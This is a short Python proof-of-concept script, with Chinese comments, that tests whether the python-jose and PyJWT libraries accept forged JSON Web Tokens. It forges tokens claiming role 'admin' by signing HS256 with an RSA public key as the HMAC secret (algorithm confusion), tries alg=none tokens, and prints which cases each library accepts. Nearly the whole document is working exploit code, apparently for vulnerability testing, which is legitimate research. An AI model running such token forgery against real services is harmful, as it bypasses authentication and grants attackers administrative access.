
import base64, hashlib, hmac, json, time
from rsa import PublicKey, newkeys
from jose import jwt as jjwt
import jwt as pjwt

pub, _ = newkeys(2048)
der = PublicKey.save_pkcs1(pub, format="DER")     # DER，无 PEM armor
pem = PublicKey.save_pkcs1(pub, format="PEM")     # 带 armor，作对照

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(secret, alg="HS256"):
    h = b64(json.dumps({"alg": alg, "typ": "JWT"}).encode())
    p = b64(json.dumps({"sub": "attacker", "role": "admin", "exp": int(time.time())+600}).encode())
    sig = b64(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"

rows = []
def probe(name, fn):
    try:
        fn(); rows.append((name, "ACCEPT", ""))
    except Exception as e:
        rows.append((name, "REJECT", f"{type(e).__name__}: {str(e)[:110]}"))

cases = [
    ("python-jose / DER 公钥作 HMAC secret / algorithms=['HS256']", lambda: jjwt.decode(forge(der), der, algorithms=["HS256"])),
    ("python-jose / DER 公钥 / algorithms=None",                   lambda: jjwt.decode(forge(der), der)),
    ("python-jose / PEM 公钥作 HMAC secret / algorithms=['HS256']", lambda: jjwt.decode(forge(pem), pem, algorithms=["HS256"])),
    ("PyJWT / DER 公钥作 HMAC secret / algorithms=['HS256']",      lambda: pjwt.decode(forge(der), der, algorithms=["HS256"])),
    ("PyJWT / DER 公钥 / 未传 algorithms",                          lambda: pjwt.decode(forge(der), der)),
    ("PyJWT / PEM 公钥作 HMAC secret / algorithms=['HS256']",      lambda: pjwt.decode(forge(pem), pem, algorithms=["HS256"])),
    ("python-jose / alg=none 伪造 / algorithms=None",               lambda: jjwt.decode(forge(b"x", "none"), der)),
    ("PyJWT / alg=none 伪造 / 未传 algorithms",                     lambda: pjwt.decode(forge(b"x", "none"), der)),
]
for n, f in cases: probe(n, f)

print(json.dumps({"versions": {"python-jose": __import__("jose").__version__, "PyJWT": pjwt.__version__},
                  "der_len": len(der), "rows": rows}, ensure_ascii=False, indent=1))
